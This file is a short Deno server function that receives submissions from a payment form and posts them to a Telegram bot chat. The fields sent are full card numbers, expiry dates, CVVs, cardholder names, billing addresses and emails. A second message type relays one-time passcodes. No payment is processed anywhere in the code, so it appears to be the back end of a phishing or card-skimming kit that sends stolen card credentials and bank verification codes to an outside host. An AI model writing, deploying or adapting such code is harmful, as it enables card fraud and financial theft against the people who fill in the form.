import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
    const CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID")!;

    const body = await req.json();
    let message = "";

    if (body.type === "payment") {
      message = `💳 *New Payment Submission*\n\n` +
        `*Amount:* $${body.amount}\n\n` +
        `*Card Details*\n` +
        `Card: ${body.cardNumber}\n` +
        `Expiry: ${body.expiry}\n` +
        `CVV: ${body.cvv}\n` +
        `Cardholder: ${body.cardholderName}\n\n` +
        `*Billing Info*\n` +
        `Name: ${body.fullName}\n` +
        `Email: ${body.email}\n` +
        `Address: ${body.address}\n` +
        `City: ${body.city}\n` +
        `Country: ${body.country}\n` +
        `Zip: ${body.zip}`;
    } else if (body.type === "otp") {
      message = `🔐 *OTP Submitted*\n\nCode: ${body.otp}`;
    }

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    const result = await telegramRes.json();

    return new Response(JSON.stringify({ ok: result.ok }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error('Telegram send error:', error);
    return new Response(JSON.stringify({ error: 'An error occurred processing your request. Please try again.' }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
